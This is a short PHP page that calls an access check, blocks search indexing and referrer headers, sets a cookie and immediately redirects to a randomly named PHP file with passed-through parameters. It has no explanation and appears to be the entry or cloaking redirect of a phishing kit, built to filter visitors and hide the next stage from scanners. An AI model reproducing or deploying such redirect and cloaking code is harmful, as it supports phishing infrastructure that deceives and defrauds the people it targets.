<?php
require 'call.php';
checkacc();
?>
<html>
<head>
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="noindex, nofollow"/>
<script type="text/javascript" language="javascript">document.cookie = "rowan=attkinson";</script>
<?php
print '<meta http-equiv="refresh" content="0; url=' . 'X0910976447c998e1.php?xex=' . $data . '&' . $string . '"></head></html>';
?>
</head>
</html>